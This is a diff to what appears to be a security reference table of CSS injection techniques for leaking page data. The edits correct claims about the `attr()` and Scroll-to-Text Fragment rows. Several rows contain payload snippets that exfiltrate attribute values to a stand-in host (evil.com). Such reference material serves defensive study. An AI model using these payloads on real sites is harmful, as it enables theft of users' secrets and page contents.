@@ -72,7 +72,7 @@ Using CSS custom properties (`var()`) as boolean switches to control request fir
 | **Variable-gated background** | `input[value^="a"]{--match:url(https://evil.com/?a)} html{background:var(--match,none)}` — the variable is only defined when the selector matches, gating the background request | CSS injection in `<style>` context; modern browser |
 | **Multiple background stacking** | Assign many `var()` references as multiple backgrounds on a single element (e.g., `html`), each gated by a different selector — enables bulk parallel testing | Element supports multiple `background-image` values (practically unlimited) |
 | **`if()` conditional chaining** | `style="background:if(style(--val:\"secret\"):url(//evil.com/match);else:none)"` — CSS `if()` function (2025 Chrome) enables conditional requests from inline `style` attributes without selectors | CSS `if()` function support; injection in `style` attribute context |
-| **`attr()` one-shot extraction** | `input[name="secret"]{background:image-set(attr(value))}` — the `attr()` function reads the entire attribute value and uses it as a relative URL, leaking the full value in a single request | CSS `attr()` extended support; `image-set()` with `attr()` argument |
+| **`attr()` one-shot extraction (draft/speculative)** | `input[name="secret"]{background:url(attr(value url))}` — the extended `attr()` function (CSS Values Level 5 draft) would read the entire attribute value as a typed URL, leaking it in a single request. **Note:** As of 2025, extended `attr()` with type coercion is NOT implemented in any major browser. The `image-set(attr(value))` form is invalid CSS because `attr()` returns a string, not an `<image>` type. This remains a **speculative future vector** pending browser adoption | CSS `attr()` Level 5 extended type support (not yet implemented in any browser) |
 
 ### §1-4. Multi-Element Enumeration
 
@@ -119,7 +119,7 @@ Using CSS scroll and animation features to create measurement oracles.
 |---|---|---|
 | **`scroll-timeline` content detection** | CSS `scroll-timeline` and `animation-timeline` features tie animations to scroll position; content changes that affect scroll height trigger different animation states, detectable via conditional `background-image` at specific progress points | Browser supports scroll-driven animations (Chrome 115+) |
 | **CSS animation as width oracle** | `@keyframes` that progressively change width, combined with `onanimationstart`/`onanimationend` timing (via CSS transitions, not JS), detect when content width crosses thresholds | Animation support; content in measurable container |
-| **Scroll-to-Text Fragment (STTF) + `:target`** | URL fragment `#:~:text=secret` scrolls to matching text; `:target::before{content:url(https://evil.com/?found)}` confirms the text exists on the page | STTF support (Chrome, Edge); user-activation gesture or same-origin HTML injection to bypass gesture requirement |
+| **Scroll-to-Text Fragment (STTF) detection** | URL fragment `#:~:text=secret` scrolls to matching text, causing a scroll position change detectable via `scroll-timeline` CSS animations. **Note:** the `:target` pseudo-class does NOT fire for STTF matches — `:target` only matches elements identified by a named `#fragment`, not text matched by STTF. Detection relies on scroll-position side-channels (§2-3 scroll-timeline), not `:target` selectors | STTF support (Chrome, Edge); scroll-driven animation support; user-activation gesture or same-origin HTML injection |
 
 ---
 
